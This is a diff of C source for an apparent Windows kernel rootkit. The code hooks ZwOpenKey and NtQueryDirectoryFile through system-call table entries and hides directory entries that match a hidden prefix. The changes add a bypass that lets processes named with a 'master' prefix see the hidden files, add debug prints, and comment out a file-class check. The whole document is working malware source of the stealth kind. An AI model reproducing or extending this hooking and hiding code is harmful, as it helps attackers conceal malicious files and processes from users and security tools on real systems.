@@ -24,8 +24,8 @@ NTAPI_LIST bn2k3 =	{ 0xc , 0x27, 0x97 , 0x102, 0xb5};
 
 //extern WCHAR hidePrefixW[];
 extern UNICODE_STRING hidePrefixW;
-extern CHAR hidePrefixA[];
-extern CHAR masterPrefix[];
+extern char *hidePrefixA;
+extern char *masterPrefix;
 
 //extern NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile;
 NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile = NULL;
@@ -145,6 +145,8 @@ HookZwOpenKey(
     )
 {
         int rc;
+        WCHAR buf[1024]; 
+        
 //        DbgPrint("Entered HookZwOpenKey\n");
 		/* open the key, as normal */
         rc=((ZWOPENKEY)(OrgZwOpenKey)) (
@@ -152,6 +154,10 @@ HookZwOpenKey(
 			DesiredAccess,
 			ObjectAttributes );
 			
+		
+//		getFullPath( buf, sizeof(buf), ObjectAttributes);
+//		DbgPrint("KEY: %S\n",buf);
+		
 //		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
       
 		return rc;
@@ -234,6 +240,8 @@ NTSTATUS NewZwQueryDirectoryFile(
 )
 {
 	NTSTATUS rc;
+	PCHAR processName = NULL;
+	PEPROCESS currentEprocess = NULL;	
 //	CHAR aProcessName[PROCNAMELEN];                                        
 //		                                                                      
 //	GetProcessName( aProcessName );                                        
@@ -251,6 +259,15 @@ NTSTATUS NewZwQueryDirectoryFile(
 			bReturnOnlyOneEntry,
 			PathMask,
 			bRestartQuery);
+
+    DbgPrint("Jestem w srodku\n");
+
+	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
+	currentEprocess = PsGetCurrentProcess();
+	if (IsPriviligedProcess( currentEprocess ) ) {
+        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
+		return rc;
+	}
 
 	if( NT_SUCCESS( rc ) && 
 		(FileInfoClass == FileDirectoryInformation ||
@@ -292,10 +309,8 @@ NTSTATUS NewZwQueryDirectoryFile(
 				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
 			} while( !bLastOne );
 	}
-	return(rc);
+	return rc;
 }
-
-
 
 //////////////////////////////////////////////////////////////////////////
 //
@@ -354,21 +369,20 @@ NTSTATUS HookNtQueryDirectoryFile(
         DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
 		return rc;
 	}
-   
+
 	if( NT_SUCCESS( rc ) ) 
-	{		
+	{
 		PDirEntry p = (PDirEntry)FileInformationBuffer;
 		PDirEntry pLast = NULL;
 		BOOLEAN bLastOne;
-                 
-       	if ((FileInfoClass != FileDirectoryInformation &&
-		 FileInfoClass != FileFullDirectoryInformation &&
-		 FileInfoClass != FileIdFullDirectoryInformation &&
-		 FileInfoClass != FileBothDirectoryInformation &&
-		 FileInfoClass != FileIdBothDirectoryInformation &&
-		 FileInfoClass != FileNamesInformation ))
-		 return rc;
-         
+
+//       	if ((FileInfoClass != FileDirectoryInformation &&
+//		 FileInfoClass != FileFullDirectoryInformation &&
+//		 FileInfoClass != FileIdFullDirectoryInformation &&
+//		 FileInfoClass != FileBothDirectoryInformation &&
+//		 FileInfoClass != FileIdBothDirectoryInformation &&
+//		 FileInfoClass != FileNamesInformation ))
+//		 return rc;
 
 	    __asm int 3
 		do 
@@ -458,11 +472,12 @@ BOOLEAN IsPriviligedProcess( PEPROCESS eproc )
 	PCHAR processName = NULL;
 	if ( eproc ) {
 		processName = (PCHAR) ( (ULONG)eproc + offsets.nameOffset );
-		//DbgPrint("CurrentEprocess: %x, processName: %d\n",eproc,processName);
+//		DbgPrint("CurrentEprocess: %x, processName: %x\n",eproc,processName);
 		if (processName) {
 			len = strlen(masterPrefix);
+//			DbgPrint("Master prefix: %s, [%ld]n",masterPrefix,len);
 			// WARNING MUST BE LESS THAN 16 !!!! EPROC HAVOC
-			if ( RtlCompareMemory( processName, masterPrefix , len ) == len )
+			if ( RtlCompareMemory( processName, masterPrefix, len ) == len )
 				return TRUE;
 		}
 	}
